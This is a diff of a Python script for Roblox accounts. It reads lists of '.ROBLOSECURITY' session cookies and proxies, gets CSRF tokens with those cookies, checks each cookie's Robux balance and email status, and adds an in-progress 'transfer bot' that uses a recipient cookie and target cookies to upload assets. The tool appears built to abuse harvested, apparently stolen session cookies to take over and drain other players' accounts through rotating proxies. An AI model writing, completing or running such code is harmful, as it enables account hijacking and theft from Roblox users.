@@ -3,14 +3,38 @@ import requests, json, threading, traceback, ctypes, os, time, random
 from colorama import Fore, Back, Style, init
 from bs4 import BeautifulSoup
 
-# Global Variables for threads to share
-globalcsrf_token = None
+from pprint import pprint
 
 init()
-# Proxies and Cookies
-proxies = open("proxies.txt", "r").read().splitlines()
-proxies = [{"https": "http://" + proxy} for proxy in proxies]
-cookies = open("cookies.txt", "r").read().splitlines()
+
+# Global Variables for threads to share
+globalcsrf_token = None
+proxies = None
+cookies = None
+test_cookie = None
+
+# Init function - Zz
+def init_proxies_and_cookies():
+    """
+    Using `with` to open the files instead 
+    of opening and reading within one line 
+    allows us to open the file without 
+    having to close it yet it is properly 
+    closed once the process is complete
+    """
+    global proxies
+
+    with open("proxies.txt", "r") as proxy_file:
+        proxies = [
+            {"https": "http://" + proxy} for proxy in proxy_file.read().splitlines()
+        ]
+
+    global cookies
+
+    with open("cookies.txt", "r") as cookies_file:
+        cookies = cookies_file.read().splitlines()
+
+
 # Funcs
 def input_sys():
     # print(Fore.YELLOW)
@@ -24,15 +48,24 @@ def clearscreen():
 
 
 # Get X-CSRF TOKEN -- SomethingElse
-def getxcsrf(i):
-    global globalcsrf_token
-    token_request = requests.session()
-    token_request.cookies[".ROBLOSECURITY"] = i
-    r = token_request.post("https://www.roblox.com/api/item.ashx?")
-    try:
-        globalcsrf_token = r.headers["X-CSRF-TOKEN"]
-    except:
-        return False
+def getxcsrf(original_cookie: str):
+    """
+    Sends a dummy request to the same URL 
+    with the given cookie and returns the 
+    X-CSRF-TOKEN that gets returned in headers
+    """
+
+    url = f"https://www.roblox.com/api/item.ashx?"
+
+    r = requests.post(url, cookies={".ROBLOSECURITY": original_cookie})
+
+    if r.status_code == 403:
+        try:
+            return r.headers["x-csrf-token"]
+        except:
+            return None
+
+    return None
 
 
 # Vip Scraper -- Tvnyl
@@ -140,6 +173,7 @@ def Cookie_checker(i):
             with open("checked_cookies.txt", "w") as f:
                 f.write(f"{i}\n | Robux {robux} | Email NotVerified")
 
+
 # Transfer bot - Zz
 def transfer_bot(recipient_cookie: str = None, target_cookies: list = None):
     """
@@ -156,30 +190,45 @@ def transfer_bot(recipient_cookie: str = None, target_cookies: list = None):
         return
 
     config_file_data = {
-        "apple": {"type": "GamePass", "name": "Transfer Test", "description": "This is my random transfer asset",}
+        "apple": {
+            "type": "GamePass",
+            "name": "Transfer Test",
+            "description": "This is my random transfer asset",
+        }
     }
 
     config_post_data = {
-        "AssetDetails": 
-            [
-                {
-                "assetId": 0,
-                "assetFileName": "config.json",
-                "uploadAssetError": "None"
-                }
-            ]
+        "AssetDetails": [
+            {"assetId": 0, "assetFileName": "config.json", "uploadAssetError": "None"}
+        ]
     }
 
     with open("config.json", "w") as f:
         json.dump(config_file_data, fp=f)
         print("Data loaded into file")
 
-    ck = {"Cookie":".ROBLOSECURITY={0}".format(getxcsrf(recipient_cookie))}
+    f = open("config.json", "r")
 
-    r = requests.post(cookies=ck,data=config_post_data)
+    files = {"upload_file": f}
+
+    ck = {
+        "Cookie": ".ROBLOSECURITY=" + recipient_cookie,
+        "X-CSRF-TOKEN": getxcsrf(recipient_cookie),
+    }
+
+    print(ck)
+
+    r = requests.post(
+        "https://publish.roblox.com/v1/assets/upload",
+        cookies=ck,
+        data=config_post_data,
+        files=files,
+    )
 
     print(r.status_code)
     print(r.text)
+
+    f.close()
 
     # IN PROGRESS
 
@@ -266,3 +315,5 @@ def favorite(i):
 
 
 # dont Put the inputs in a function
+
+init_proxies_and_cookies()
